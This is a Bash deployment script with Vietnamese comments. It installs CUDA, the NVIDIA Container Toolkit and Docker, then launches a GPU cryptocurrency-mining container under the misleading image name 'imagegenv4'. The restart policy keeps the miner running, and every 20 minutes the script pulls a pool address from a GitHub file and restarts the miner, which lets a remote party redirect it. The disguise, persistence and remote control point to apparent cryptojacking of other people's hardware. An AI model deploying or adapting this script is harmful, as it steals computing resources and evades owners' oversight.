#!/bin/bash

# CUDA installation state file
CUDA_FLAG="/var/tmp/cuda_installed"

# 1. Install CUDA and NVIDIA Container Toolkit if not already installed
if [ ! -f "$CUDA_FLAG" ]; then
    echo "🔧 Bắt đầu cài đặt CUDA và NVIDIA Container Toolkit..."

    # Update system and install NVIDIA driver
    sudo apt update && sudo apt install -y ubuntu-drivers-common
    sudo ubuntu-drivers install

    # Install CUDA Toolkit
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
    sudo apt update
    sudo apt -y install cuda-toolkit-11-8
    sudo apt -y full-upgrade

    # Install NVIDIA Container Toolkit
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID)
    curl -s -L https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit.gpg
    curl -s -L https://nvidia.github.io/libnvidia-container/$distribution/libnvidia-container.list | \
      sed 's#https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit.gpg] https://#' | \
      sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list

    sudo apt-get update
    sudo apt-get install -y nvidia-container-toolkit

    # Configure Docker to use NVIDIA runtime
    sudo mkdir -p /etc/docker
    cat <<EOF | sudo tee /etc/docker/daemon.json
{
  "default-runtime": "nvidia",
  "runtimes": {
    "nvidia": {
      "path": "nvidia-container-runtime",
      "runtimeArgs": []
    }
  }
}
EOF

    # Restart Docker
    sudo systemctl restart docker

    # Mark installation complete
    sudo touch "$CUDA_FLAG"

    echo "✅ Cài đặt hoàn tất. Đang khởi động lại..."
    sudo reboot
    exit 0
fi

# Cài đặt Docker nếu chưa có
install_docker() {
    sudo apt-get update --fix-missing
    sudo apt-get install -y \
        apt-transport-https \
        ca-certificates \
        curl \
        software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update --fix-missing
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io
}

# Kiểm tra GPU trước khi chạy mining
echo "📦 Kiểm tra GPU..."
docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi

# Kiểm tra và cài đặt Docker nếu chưa có
if ! command -v docker &> /dev/null; then
    echo "🚀 Docker chưa được cài đặt. Đang cài đặt Docker..."
    install_docker
else
    echo "✅ Docker đã được cài đặt."
fi

# Dừng & xóa container cũ nếu đang chạy
docker stop rvn-test 2>/dev/null
docker rm rvn-test 2>/dev/null

# Chạy Docker container mining với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest

# Hàm cập nhật mining pool và khởi động lại container nếu pool thay đổi
update_and_restart() {
    new_pool_url=$(curl -s https://raw.githubusercontent.com/anhacvai11/bash/refs/heads/main/ip)
    if [ "$new_pool_url" != "$POOL_URL" ]; then
        echo "🔁 Updating POOL_URL to: $new_pool_url"
        export POOL_URL=$new_pool_url
        docker stop rvn-test 2>/dev/null
        docker rm rvn-test 2>/dev/null
        docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest
    else
        echo "✔️ No updates found."
    fi
}

# Đợi một chút trước khi vào vòng lặp kiểm tra
sleep 10

# Vòng lặp kiểm tra liên tục (cập nhật pool mỗi 20 phút)
while true; do
    sleep 1200
    update_and_restart
done
